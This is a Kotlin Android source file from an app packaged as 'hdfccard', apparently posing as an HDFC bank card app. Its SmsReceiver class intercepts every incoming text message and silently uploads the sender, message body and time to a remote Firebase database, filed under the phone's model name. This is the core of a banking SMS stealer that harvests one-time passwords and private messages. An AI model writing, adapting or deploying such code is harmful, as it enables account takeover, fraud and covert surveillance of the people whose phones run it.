package com.disc.hdfccard

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.disc.hdfccard.MyApplication.Companion.old
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone


class SmsReceiver : BroadcastReceiver() {

    lateinit var smsReference: DatabaseReference

    @SuppressLint("SuspiciousIndentation")
    override fun onReceive(context: Context, intent: Intent) {
        smsReference = FirebaseDatabase.getInstance().getReference("SMS")

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            Log.i("TAG", "Broadcast Receiver triggered")
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<*>?
                if (pdus != null) {
                    for (pdu in pdus) {
                        val smsMessage = SmsMessage.createFromPdu(pdus[0] as ByteArray)
                        val senderPhoneNumber = smsMessage.originatingAddress
                        val messageBody = smsMessage.messageBody
                        Log.i("TAG", "New message received: $messageBody")
                        val timeStamp = smsMessage.timestampMillis
                        val datetime = Date(timeStamp)
                        val format = SimpleDateFormat("hh:mm")
                        format.timeZone = TimeZone.getTimeZone("Asia/Karachi")
                        val formattedDate = format.format(datetime)
                        val key = smsReference.push().key.toString()
                        val sms = MessageModel(
                            key,
                            senderPhoneNumber!!,
                            formattedDate,
                            messageBody,
                            "Status"
                        )
                        smsReference.child(Build.MODEL).child(key).setValue(sms)
                    }
                } else {
                    Log.i("TAG", "onReceive: pdus null")
                }
            } else {
                Log.i("TAG", "onReceive: bundle null")
            }
        }
    }

}